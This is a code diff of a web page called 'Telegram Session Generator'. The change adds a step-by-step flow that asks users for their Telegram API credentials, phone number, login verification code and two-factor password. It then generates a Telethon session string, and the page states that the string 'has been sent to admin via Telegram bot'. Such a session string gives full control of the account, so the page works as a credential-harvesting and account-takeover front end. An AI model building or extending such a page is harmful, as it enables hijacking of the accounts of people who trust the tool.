@@ -16,11 +16,14 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .container {
             max-width: 500px;
-            margin: 0 auto;
+            width: 100%;
             background: white;
             border-radius: 15px;
             padding: 30px;
@@ -93,13 +96,28 @@
             transform: none;
         }
 
+        .btn-secondary {
+            background: #6c757d;
+        }
+
+        .btn-secondary:hover {
+            background: #5a6268;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
         .result {
             margin-top: 25px;
             padding: 20px;
             background: #f8f9fa;
             border-radius: 8px;
             border-left: 4px solid #667eea;
-            display: none;
         }
 
         .result.success {
@@ -120,6 +138,8 @@
             font-size: 14px;
             word-break: break-all;
             white-space: pre-wrap;
+            width: 100%;
+            resize: vertical;
         }
 
         .loading {
@@ -164,82 +184,232 @@
             margin-bottom: 5px;
             color: #555;
         }
+
+        .otp-input {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 8px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e1e5e9;
+            z-index: 1;
+        }
+
+        .step-item {
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-number {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #e1e5e9;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px;
+            font-weight: bold;
+        }
+
+        .step-item.active .step-number {
+            background: #667eea;
+            color: white;
+        }
+
+        .step-item.completed .step-number {
+            background: #28a745;
+            color: white;
+        }
+
+        .step-label {
+            font-size: 12px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .step-item.active .step-label {
+            color: #667eea;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 Telegram Session Generator</h1>
-            <p>Generate Telegram session strings easily</p>
+            <p>Generate Telethon session strings with OTP verification</p>
         </div>
 
-        <div class="info-box">
-            <h3>📝 How to get API credentials:</h3>
-            <ul>
-                <li>Go to <a href="https://my.telegram.org" target="_blank">my.telegram.org</a></li>
-                <li>Login with your phone number</li>
-                <li>Go to "API Development Tools"</li>
-                <li>Create a new application</li>
-                <li>Copy API ID and API Hash</li>
-            </ul>
+        <div class="step-indicator">
+            <div class="step-item active" id="step1-indicator">
+                <div class="step-number">1</div>
+                <div class="step-label">Credentials</div>
+            </div>
+            <div class="step-item" id="step2-indicator">
+                <div class="step-number">2</div>
+                <div class="step-label">OTP Verification</div>
+            </div>
+            <div class="step-item" id="step3-indicator">
+                <div class="step-number">3</div>
+                <div class="step-label">Session</div>
+            </div>
         </div>
 
-        <form id="sessionForm">
-            <div class="form-group">
-                <label for="api_id">API ID:</label>
-                <input type="number" id="api_id" placeholder="Enter your API ID" required>
+        <!-- Step 1: Credentials -->
+        <div class="step active" id="step1">
+            <div class="info-box">
+                <h3>📝 How to get API credentials:</h3>
+                <ul>
+                    <li>Go to <a href="https://my.telegram.org" target="_blank">my.telegram.org</a></li>
+                    <li>Login with your phone number</li>
+                    <li>Go to "API Development Tools"</li>
+                    <li>Create a new application</li>
+                    <li>Copy API ID and API Hash</li>
+                </ul>
             </div>
 
-            <div class="form-group">
-                <label for="api_hash">API Hash:</label>
-                <input type="text" id="api_hash" placeholder="Enter your API Hash" required>
+            <form id="credentialsForm">
+                <div class="form-group">
+                    <label for="api_id">API ID:</label>
+                    <input type="number" id="api_id" placeholder="Enter your API ID" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="api_hash">API Hash:</label>
+                    <input type="text" id="api_hash" placeholder="Enter your API Hash" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number:</label>
+                    <input type="text" id="phone" placeholder="+1234567890" required>
+                </div>
+
+                <button type="submit" class="btn" id="requestCodeBtn">
+                    Request Verification Code
+                </button>
+            </form>
+        </div>
+
+        <!-- Step 2: OTP Verification -->
+        <div class="step" id="step2">
+            <div class="info-box">
+                <h3>📱 Verification Code Sent</h3>
+                <p>We've sent a verification code to your Telegram account. Please enter it below:</p>
             </div>
 
-            <div class="form-group">
-                <label for="phone">Phone Number:</label>
-                <input type="text" id="phone" placeholder="+1234567890" required>
+            <form id="otpForm">
+                <div class="form-group">
+                    <label for="otp_code">Verification Code:</label>
+                    <input type="text" id="otp_code" class="otp-input" placeholder="Enter 5-digit code" required maxlength="5">
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password (if 2FA enabled):</label>
+                    <input type="password" id="password" placeholder="Enter your password (optional)">
+                </div>
+
+                <button type="submit" class="btn" id="verifyOtpBtn">
+                    Verify & Generate Session
+                </button>
+                <button type="button" class="btn btn-secondary" id="backToStep1" style="margin-top: 10px;">
+                    Back
+                </button>
+            </form>
+        </div>
+
+        <!-- Step 3: Results -->
+        <div class="step" id="step3">
+            <div class="result" id="result">
+                <h3 id="resultTitle">Session Generated Successfully!</h3>
+                <p>Your Telethon session string:</p>
+                <textarea class="session-string" id="sessionString" rows="6" readonly></textarea>
+                <p style="margin-top: 10px; font-size: 14px; color: #666;">
+                    ✅ Session has been sent to admin via Telegram bot
+                </p>
             </div>
 
-            <button type="submit" class="btn" id="generateBtn">
-                Generate Session
+            <button type="button" class="btn btn-secondary" id="newSessionBtn" style="margin-top: 20px;">
+                Generate New Session
             </button>
-        </form>
+        </div>
 
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Generating session... Please wait</p>
-        </div>
-
-        <div class="result" id="result">
-            <h3 id="resultTitle">Session Generated Successfully!</h3>
-            <p>Your session string:</p>
-            <textarea class="session-string" id="sessionString" rows="6" readonly></textarea>
-            <p style="margin-top: 10px; font-size: 14px; color: #666;">
-                ✅ Session has been sent to admin via Telegram bot
-            </p>
+            <p id="loadingText">Processing... Please wait</p>
         </div>
     </div>
 
     <script>
-        document.getElementById('sessionForm').addEventListener('submit', async function(e) {
+        let currentStep = 1;
+        let sessionData = null;
+
+        function showStep(step) {
+            // Hide all steps
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.step-item').forEach(s => s.classList.remove('active', 'completed'));
+            
+            // Show current step
+            document.getElementById(`step${step}`).classList.add('active');
+            
+            // Update step indicator
+            for (let i = 1; i <= step; i++) {
+                const indicator = document.getElementById(`step${i}-indicator`);
+                if (i === step) {
+                    indicator.classList.add('active');
+                } else {
+                    indicator.classList.add('completed');
+                }
+            }
+            
+            currentStep = step;
+        }
+
+        function showLoading(text = 'Processing... Please wait') {
+            document.getElementById('loadingText').textContent = text;
+            document.getElementById('loading').style.display = 'block';
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        function showError(message) {
+            const result = document.getElementById('result');
+            result.className = 'result error';
+            document.getElementById('resultTitle').textContent = '❌ Error';
+            document.getElementById('sessionString').value = message;
+            showStep(3);
+        }
+
+        // Step 1: Request verification code
+        document.getElementById('credentialsForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const api_id = document.getElementById('api_id').value;
             const api_hash = document.getElementById('api_hash').value;
             const phone = document.getElementById('phone').value;
-            const generateBtn = document.getElementById('generateBtn');
-            const loading = document.getElementById('loading');
-            const result = document.getElementById('result');
-            const resultTitle = document.getElementById('resultTitle');
-            const sessionString = document.getElementById('sessionString');
 
-            // Reset UI
-            result.style.display = 'none';
-            generateBtn.disabled = true;
-            loading.style.display = 'block';
+            showLoading('Sending verification code...');
 
             try {
-                const response = await fetch('/api/generate-session', {
+                const response = await fetch('/api/request-code', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -254,26 +424,80 @@
                 const data = await response.json();
 
                 if (data.success) {
-                    result.className = 'result success';
-                    resultTitle.textContent = '✅ Session Generated Successfully!';
-                    sessionString.value = data.session_string;
-                    result.style.display = 'block';
+                    sessionData = {
+                        api_id: parseInt(api_id),
+                        api_hash: api_hash,
+                        phone: phone,
+                        phone_code_hash: data.phone_code_hash
+                    };
+                    showStep(2);
                 } else {
-                    result.className = 'result error';
-                    resultTitle.textContent = '❌ Error';
-                    sessionString.value = data.error || 'An unknown error occurred';
-                    result.style.display = 'block';
+                    alert('Error: ' + data.error);
                 }
             } catch (error) {
-                result.className = 'result error';
-                resultTitle.textContent = '❌ Network Error';
-                sessionString.value = 'Failed to connect to server: ' + error.message;
-                result.style.display = 'block';
+                alert('Network error: ' + error.message);
             } finally {
-                generateBtn.disabled = false;
-                loading.style.display = 'none';
+                hideLoading();
             }
         });
+
+        // Step 2: Verify OTP and generate session
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const otp_code = document.getElementById('otp_code').value;
+            const password = document.getElementById('password').value;
+
+            if (!sessionData) {
+                alert('Session data missing. Please start over.');
+                return;
+            }
+
+            showLoading('Verifying code and generating session...');
+
+            try {
+                const response = await fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        ...sessionData,
+                        otp_code: otp_code,
+                        password: password
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    document.getElementById('sessionString').value = data.session_string;
+                    showStep(3);
+                } else {
+                    alert('Error: ' + data.error);
+                }
+            } catch (error) {
+                alert('Network error: ' + error.message);
+            } finally {
+                hideLoading();
+            }
+        });
+
+        // Navigation buttons
+        document.getElementById('backToStep1').addEventListener('click', function() {
+            showStep(1);
+        });
+
+        document.getElementById('newSessionBtn').addEventListener('click', function() {
+            // Reset form
+            document.getElementById('credentialsForm').reset();
+            document.getElementById('otpForm').reset();
+            sessionData = null;
+            showStep(1);
+        });
+
+        // Initialize
+        showStep(1);
     </script>
 </body>
 </html>
